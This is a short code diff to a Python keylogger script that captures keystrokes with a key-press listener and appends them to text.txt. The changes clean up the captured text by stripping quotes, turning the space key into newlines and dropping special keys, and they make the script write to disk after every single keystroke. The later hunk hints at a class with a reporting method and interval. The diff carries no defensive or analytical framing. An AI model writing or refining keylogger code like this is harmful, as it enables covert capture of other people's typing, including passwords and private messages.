@@ -18,7 +18,11 @@ if opt == 1:
     def write_to_file(keys):
         with open("text.txt","a") as f:
             for key in keys:
-                f.write(str(key))
+                k = str(key).replace("'","")
+                if k.find("space")>0:
+                    f.write('\n')
+                elif k.find("Key") == -1:
+                    f.write(k)
 
     def on_press(key):
         logging.info(str(key))
@@ -26,7 +30,7 @@ if opt == 1:
         keys.append(key)
         count += 1
 
-        if count >= 10:
+        if count >= 1:
             count = 0
             write_to_file(keys)
             keys = []
@@ -49,7 +53,6 @@ else:
             self.interval = interval
             self.report_method = report_method
             self.log = ""
-
             self.start_dt = datetime.now()
             self.end_dt = datetime.now()
 
